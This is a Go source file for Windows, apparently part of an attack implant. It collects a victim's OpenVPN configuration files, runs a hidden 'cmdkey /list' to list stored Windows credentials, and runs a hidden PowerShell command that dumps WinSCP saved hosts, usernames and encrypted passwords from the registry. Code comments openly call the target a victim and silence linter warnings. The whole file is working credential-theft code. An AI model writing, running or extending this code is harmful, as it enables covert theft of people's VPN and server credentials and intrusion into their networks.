//go:build windows
// +build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// exportVpnCreds collects OpenVPN configs, Windows Credential Manager entries, and WinSCP session data.
func exportVpnCreds() string {
	var sb strings.Builder

	sb.WriteString("=== OpenVPN Configs ===\n")
	sb.WriteString(collectOpenVPNConfigs())

	sb.WriteString("\n=== Windows Credential Manager (cmdkey) ===\n")
	sb.WriteString(collectCmdKeyList())

	sb.WriteString("\n=== WinSCP Sessions (registry) ===\n")
	sb.WriteString(collectWinSCPSessions())

	return sb.String()
}

func collectOpenVPNConfigs() string {
	paths := []string{
		filepath.Join(os.Getenv("USERPROFILE"), "OpenVPN", "config"),
		filepath.Join(os.Getenv("APPDATA"), "OpenVPN", "config"),
		`C:\Program Files\OpenVPN\config`,
		`C:\Program Files (x86)\OpenVPN\config`,
	}

	var sb strings.Builder
	found := 0
	seen := map[string]bool{}
	for _, root := range paths {
		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}
			if !strings.EqualFold(filepath.Ext(path), ".ovpn") {
				return nil
			}
			if seen[path] {
				return nil
			}
			seen[path] = true
			// #nosec G122 -- victim-side collection over the victim's own profile tree.
			data, err := os.ReadFile(path) // #nosec G122
			if err != nil {
				return nil
			}
			sb.WriteString(fmt.Sprintf("--- %s ---\n%s\n", path, string(data)))
			found++
			return nil
		})
	}
	if found == 0 {
		sb.WriteString("(no .ovpn files found)\n")
	}
	return sb.String()
}

func collectCmdKeyList() string {
	cmd := exec.Command("cmdkey.exe", "/list")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("cmdkey failed: %v\n%s", err, string(out))
	}
	text := strings.TrimSpace(string(out))
	if text == "" {
		return "(no stored credentials)\n"
	}
	return text + "\n"
}

func collectWinSCPSessions() string {
	// WinSCP stores session hostnames and encrypted passwords under HKCU\Software\Martin Prikryl\WinSCP 2\Sessions
	ps := `$base='HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions'; if(!(Test-Path $base)){Write-Output '(WinSCP not installed or no sessions)'; exit}; Get-ChildItem $base | ForEach-Object { $n=$_.PSChildName; $p=Get-ItemProperty $_.PSPath; Write-Output "Session: $n"; if($p.HostName){Write-Output "  Host: $($p.HostName)"}; if($p.UserName){Write-Output "  User: $($p.UserName)"}; if($p.Password){Write-Output "  Password: $($p.Password)"}; if($p.PortNumber){Write-Output "  Port: $($p.PortNumber)"}; Write-Output '---' }`
	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", ps)
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("WinSCP registry read failed: %v\n%s", err, string(out))
	}
	text := strings.TrimSpace(string(out))
	if text == "" {
		return "(no WinSCP sessions)\n"
	}
	return text + "\n"
}
